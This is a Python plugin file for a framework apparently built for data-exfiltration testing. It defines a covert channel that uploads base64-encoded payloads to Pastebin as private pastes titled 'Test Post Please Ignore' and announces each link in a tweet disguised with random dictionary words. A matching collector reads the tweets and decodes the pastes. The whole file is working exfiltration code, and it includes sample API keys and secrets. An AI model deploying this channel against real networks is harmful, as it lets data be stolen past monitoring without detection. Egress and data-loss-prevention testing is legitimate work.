__author__ = 'ryan.ohoro'

import base64
from TwitterAPI import TwitterAPI
import requests
import random
import os

from classes.oftgplugin import OFTGAPIPlugin

class OFTGTwitterPastebin(OFTGAPIPlugin):

    INFO = {
        'Title': 'Twitter/Pastebin',
        'Usage': '''\
        1. Create a Twitter account
        2. Create a Twitter application
        3. Generate an access token for the account from the developer console
        4. Configure the plugin with the Twitter API key, secret, account access token, and account access secret\
        ''',
        'Author': 'Ryan O\'Horo'
    }

    PROPERTIES = {'account_nickname':
                      {'Label': 'Nickname',
                       'Default': '',
                       'Sample': 'oftgninjaexfil',
                       'Type': 'string',
                       'Value': None},
                  'twitter_username':
                      {'Label': 'Twitter User',
                       'Default': '',
                       'Sample': 'mytwitteraccount',
                       'Type': 'string',
                       'Value': None},
                  'twitter_key':
                      {'Label': 'Twitter API Key',
                       'Default': '',
                       'Sample': 'Es0Lq6tazAY8r2236tF6Er2RM',
                       'Type': 'string',
                       'Value': None},
                  'twitter_secret':
                      {'Label': 'Twitter API Secret',
                       'Default': '',
                       'Sample': 'MjTFPH1CuhNjgCgIdVWcsXuR3sW1TmyHNXwkBvDBoiYjDJRp3y',
                       'Type': 'string',
                       'Value': None},
                  'twitter_access_key':
                      {'Label': 'Twitter Access Key',
                       'Default': '',
                       'Sample': '3217850298-YuUu4o6KzhBKqM40ztC25SHbtM74vrGgpQkCmg2',
                       'Type': 'string',
                       'Value': None},
                  'twitter_access_secret':
                      {'Label': 'Twitter Access Secret',
                       'Default': '',
                       'Sample': '7GFhXe0XHmwygYNEC0M0BzqFemk3iikZJdKOqTCqaJ7dX',
                       'Type': 'string',
                       'Value': None},
                  'pastebin_username':
                      {'Label': 'Pastebin User',
                       'Default': '',
                       'Sample': 'mypastebinuser',
                       'Type': 'string',
                       'Value': None},
                  'pastebin_password':
                      {'Label': 'Pastebin Password',
                       'Default': '',
                       'Sample': 'password',
                       'Type': 'string',
                       'Value': None},
                  'pastebin_key':
                      {'Label': 'Pastebin API Key',
                       'Default': '',
                       'Sample': '01575a7219c62129b1366312becd9f17',
                       'Type': 'string',
                       'Value': None}
    }

    # This value is the maximum practical payload size for the given protocol.
    # It's used to limit the chunk size of large payloads
    DATASIZE = 500000

    def pastebin_login(self):

        self.logger.debug('Logging in to Pastebin')

        postdata = {
            'api_dev_key': self.PROPERTIES['pastebin_key']['Value'],
            'api_user_name': self.PROPERTIES['pastebin_username']['Value'],
            'api_user_password': self.PROPERTIES['pastebin_password']['Value']}

        rp = requests.post('http://pastebin.com/api/api_login.php', data=postdata)

        if rp.text[:15] == 'Bad API request':
            raise Exception('Pastebin error %i %s' % (rp.status_code, rp.text))

        # Meaningless unless Pastebin changes their API
        if rp.status_code == 200:
            return rp.text
        else:
            raise Exception('Pastebin error %i %s' % (rp.status_code, rp.text))

    def emitter(self):

        try:
            user_session = self.pastebin_login()

            for payload in self.encoder(self.payload):
                self.logger.debug('Posting to Pastebin')
                postdata = {'api_option': 'paste',
                            'api_paste_private': '1',
                            'api_paste_format': 'text',
                            'api_paste_expire_date': '10M',
                            'api_paste_name': 'Test Post Please Ignore',
                            'api_dev_key': self.PROPERTIES['pastebin_key']['Value'],
                            'api_user_key': user_session,
                            'api_paste_code': base64.b64encode(payload)}

                rp = requests.post('http://pastebin.com/api/api_post.php', data=postdata)

                # The Pastebin API returns HTTP 200 even when an error occurs (ugh), so we just check for a URI response
                if rp.text[:4] == 'http':
                    self.logger.debug('Updating Twitter')
                    api = TwitterAPI(self.PROPERTIES['twitter_key']['Value'],
                                     self.PROPERTIES['twitter_secret']['Value'],
                                     self.PROPERTIES['twitter_access_key']['Value'],
                                     self.PROPERTIES['twitter_access_secret']['Value'])
                    words = open(os.path.join('plugins', 'oftg-twitterpastebin', 'dictionary.txt')).read().splitlines()
                    rt = api.request('statuses/update', {'status': '%s %s %s %s %s %s' % (
                    random.choice(words), random.choice(words), random.choice(words), random.choice(words),
                    random.choice(words), rp.text)})
                    if not rt.status_code == 200:
                        raise Exception('Twitter update failed %i %s' % (rt.status_code, rt.text))
                else:
                    raise Exception('Pastebin error %i %s' % (rp.status_code, rp.text))
        except Exception:
            raise

    def collector(self, undefined):

        # Parses the API response and returns the relevant parameter
        def apifilter(apiresponse):

            try:
                subtype = None
                payload = None
                result = {}

                try:
                    if 'entities' not in apiresponse:
                        return None
                    urls = apiresponse['entities']['urls']
                    for url in urls:
                        pastebin = 'http://pastebin.com/raw.php?i=%s' % url['expanded_url'][-8:]
                        subtype = url['expanded_url'][-8:]
                        res = requests.get(pastebin)
                        payload = base64.b64decode(res.text)
                        break
                except KeyError as e:
                    self.logger.error('API JSON error %s: %s' % (self.__class__.__name__, e))
                    pass

                result = self.decoder(payload)
                # TODO: Match plugin hashes
                if result:
                    result['Subtype'] = subtype
                    result['Protocol Subtype'] = 'Bin'
                    result['Source Host'] = 'Pastebin'

                    return result
            except Exception as e:
                self.logger.error('API filter failed for %s: %s' % (self.__class__.__name__, e))
                raise

        try:
            api = TwitterAPI(self.PROPERTIES['twitter_key']['Value'], self.PROPERTIES['twitter_secret']['Value'],
                             self.PROPERTIES['twitter_access_key']['Value'],
                             self.PROPERTIES['twitter_access_secret']['Value'])
            r = api.request('user', {})
            return [r.get_iterator(), 'Bin', apifilter]
        except Exception as e:
            # If the decoding fails, it just wasn't meant to be.
            self.logger.error('API failed to load for %s: %s' % (self.__class__.__name__, e))
            raise




